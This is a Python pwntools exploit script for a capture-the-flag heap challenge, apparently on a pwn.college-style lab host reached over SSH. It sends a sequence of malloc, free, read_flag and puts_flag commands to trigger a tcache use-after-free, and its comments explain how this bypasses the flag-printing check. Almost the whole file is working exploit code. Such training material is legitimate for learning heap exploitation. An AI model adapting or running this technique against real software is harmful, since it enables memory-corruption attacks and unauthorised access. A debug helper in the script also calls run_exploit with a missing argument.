#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = '5.0'

context.arch = "amd64"

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main''')
    run_exploit(p)

def print_send_print(line_to_send, p):
    p.sendline(line_to_send)
    if get_flag:
        print(p.recvrepeat(1).decode())
    else:
        print(p.recvrepeat(0.2).decode())

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)

    # the 'puts_flag' function will check if the first 8 bytes of the allocation
    # made by read_flag is different from null. If its not null, print the allocation
    # with the flag.
    # so, i did two mallocs and freed them. When read_flag is called and gets from tcache
    # my last freed malloc (the number 1), these chunk has the "NEXT" field pointing to
    # something (the chunk 0 has null in this field for obvious reason). Thats why i had
    # to do two allocations.
    # when we freed the chunk number 1, we still can call puts_flag pointer to this 
    # freed chunk and the start of the chunk will not be null anymore (before the free it is).

    commands = ['malloc 0 416', # creating two chunks
                'malloc 1 416',
                'free 0', # freeing two chunks
                'free 1',
                'read_flag', # read_flag will get the chunk number 1
                'free 1', # free number 1
                'puts_flag', # puts_flag will use the freed chunk number 1 and bypass validation
                'quit']
    
    print(p.recvrepeat(1).decode())

    for command in commands:
        print('COMMAND: ', command)
        print_send_print(command, p)

    p.interactive()

if get_flag:
    ssh_connection = ssh(host='college',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    p = process('./' + chall_name)
    run_exploit(p, False)
